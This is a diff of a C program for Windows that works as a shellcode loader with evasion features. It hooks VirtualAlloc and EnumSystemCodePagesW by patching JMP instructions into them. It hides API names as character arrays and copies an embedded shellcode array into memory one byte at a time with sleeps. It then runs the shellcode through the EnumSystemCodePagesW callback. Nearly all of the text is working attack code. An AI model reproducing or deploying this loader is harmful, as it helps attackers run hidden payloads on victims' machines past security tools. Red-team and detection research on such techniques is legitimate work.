@@ -33,10 +33,17 @@ unsigned char shellcode[] =
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
 FARPROC origVirtualAlloc = NULL;
+FARPROC origEnumSystemCodePagesW = NULL;
+
 char origVirtualAllocBytes[14] = { 0 };
+char origEnumSystemCodePagesWBytes[14] = { 0 };
+
 SIZE_T bytesWritten = 0;
 HANDLE hProcess = GetCurrentProcess();
 
+WCHAR strkernel32dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
+char strEnumSystemCodePagesW[] = { 'E','n','u','m','S','y','s','t','e','m','C','o','d','e','P','a','g','e','s','W', 0x0 };
+char strVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0x0 };
 
 // Define the hooked function
 LPVOID __stdcall HookedVirtualAlloc(
@@ -57,30 +64,57 @@ LPVOID __stdcall HookedVirtualAlloc(
 	return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
 }
 
-int main() {
+BOOL __stdcall HookedEnumSystemCodePagesW(CODEPAGE_ENUMPROCW lpCodePageEnumProc, DWORD dwFlags) {
 
+	BOOL restoreEnumSystemCodePagesW = WriteProcessMemory(hProcess, 
+			(LPVOID)origEnumSystemCodePagesW, 
+			origEnumSystemCodePagesWBytes, 
+			sizeof(origEnumSystemCodePagesWBytes), 
+			&bytesWritten );
+
+	if (0 == restoreEnumSystemCodePagesW) {
+		printf("[-] Failed restoring original EnumSystemCodePagesW\n");
+		return FALSE;
+	}
+
+	return EnumSystemCodePagesW(lpCodePageEnumProc, dwFlags);
+}
+
+
+int main() 
+{
 	SIZE_T readBytes;
 
 	// Load the kernel32 libary to get the address of VirtualAlloc
-	HMODULE k32lib = LoadLibraryW(L"kernel32.dll");
+	HMODULE k32lib = LoadLibraryW(strkernel32dll);
 	if (k32lib == NULL) {
 		printf("[-] Failed loading kernel32 library\n");
 		return -1;
 	}
 
 	// Address of original VirtualAlloc
-	origVirtualAlloc = GetProcAddress(k32lib, "VirtualAlloc");
+	origVirtualAlloc = GetProcAddress(k32lib, strVirtualAlloc);
+	origEnumSystemCodePagesW = GetProcAddress(k32lib, strEnumSystemCodePagesW);
+	
 	printf("[*] Address of original VirtualAlloc -> [ %p ]\n", origVirtualAlloc);
+	printf("[*] Address of original EnumSystemCodePagesW -> [ %p ]\n", origEnumSystemCodePagesW);
 
 	FreeLibrary(k32lib);
 
 	// Read the first 14 bytes from the address of VirtualAlloc
-	BOOL rBytes = ReadProcessMemory(hProcess, origVirtualAlloc, origVirtualAllocBytes, 14, &readBytes);
-	if (FALSE == rBytes) {
-		printf("[-] Failed reading the first 8 bytes of VirtualAlloc\n");
+	BOOL rVirtualAllocBytes = ReadProcessMemory(hProcess, origVirtualAlloc, origVirtualAllocBytes, 14, &readBytes);
+	if (FALSE == rVirtualAllocBytes) {
+		printf("[-] Failed reading the first 14 bytes of VirtualAlloc\n");
 		return -2;
 	}
 
+	BOOL rEnumSystemCodePagesWBytes = ReadProcessMemory(hProcess, origEnumSystemCodePagesW, origEnumSystemCodePagesWBytes, 14, &readBytes);
+	if (FALSE == rEnumSystemCodePagesWBytes) {
+		printf("[-] Failed reading the first 14 bytes of EnumSystemCodePagesW\n");
+		return -2;
+	}
+
+	
 	// Reference the address of the hooked function 
 	// so we can jump to it
 	void* hookedVirtualAlloc = &HookedVirtualAlloc;
@@ -91,22 +125,19 @@ int main() {
 	// Patch is: <14 bytes> -> JMP [RIP+0]; <ADDR64>
 	// \xFF\x25\x00\x00\x00\x00
 	// \x00\x11\x22\x33\x44\x55\x66\x77 (<ADDR64>)
-	char patch[14] = { 0 };
-	printf("[*] Address of patch[] -> [ %p ]\n", (void*)patch);
+	char patchVirtualAlloc[14] = { 0 };
+	printf("[*] Address of VirtualAlloc patch[] -> [ %p ]\n", (void*)patchVirtualAlloc);
 
-	memcpy_s(patch, sizeof(patch), "\xff\x25", 2);
-	memcpy_s(patch + 6, sizeof(patch), &hookedVirtualAlloc, 8);
-
-	//printf("[!] (! After Patch !) Hit Enter ! \n");
-	//getchar();
-
-	BOOL patched = WriteProcessMemory(hProcess, (LPVOID)origVirtualAlloc, patch, sizeof(patch), &bytesWritten);
+	memcpy_s(patchVirtualAlloc, sizeof(patchVirtualAlloc), "\xff\x25", 2);
+	memcpy_s(patchVirtualAlloc + 6, sizeof(patchVirtualAlloc), &hookedVirtualAlloc, 8);
+	
+	BOOL patched = WriteProcessMemory(hProcess, (LPVOID)origVirtualAlloc, patchVirtualAlloc, sizeof(patchVirtualAlloc), &bytesWritten);
 	if (0 == patched) {
 		printf("[-] Failed patching VirtualAlloc\n");
 		return -3;
 	}
 
-	printf("[+] Patched and hook applied !\n");
+	printf("[+] Patched VirtualAlloc and hook applied !\n");
 
 	CloseHandle(hProcess);
 
@@ -116,17 +147,28 @@ int main() {
 		return -4;
 	}
 
-	printf("[+] Allocated memory by hooked function -> [ %p ]\n", memory);
+	printf("[+] Allocated memory by hooked VirtualAlloc function -> [ %p ]\n", memory);
 
 	// Move 1 byte at a time and execute :)
 	for (int i = 0; i < sizeof(shellcode); i++) {
 		SIZE_T mem = (SIZE_T)memory + i;
 		RtlCopyMemory((LPVOID)mem, &shellcode[i], sizeof(shellcode[i]));
 		Sleep(50);
-
+	
 	}
 
-	//RtlMoveMemory(memory, shellcode, sizeof(shellcode));
+	void* hookedEnumSystemCodePagesW = &HookedEnumSystemCodePagesW;
+	printf("[*] Address of HookedEnumSystemPagesW -> [ %p ]\n", hookedEnumSystemCodePagesW);
+
+	char patchEnumSystemCodePagesW[14] = { 0 };
+	printf("[*] Address of EnumSystemCodePagesW patch[] -> [ %p ]\n", (void*)patchEnumSystemCodePagesW);
+
+	memcpy_s(patchEnumSystemCodePagesW, sizeof(patchEnumSystemCodePagesW), "\xff\x25", 2);
+	memcpy_s(patchEnumSystemCodePagesW + 6, sizeof(patchEnumSystemCodePagesW), &hookedEnumSystemCodePagesW, 8);
+
+	printf("[+] Patched EnumSystemCodePagesW and hook applied !\n");
+	printf("[+] Execution\n");
+
 	EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)memory, 0);
 
 	return 0;
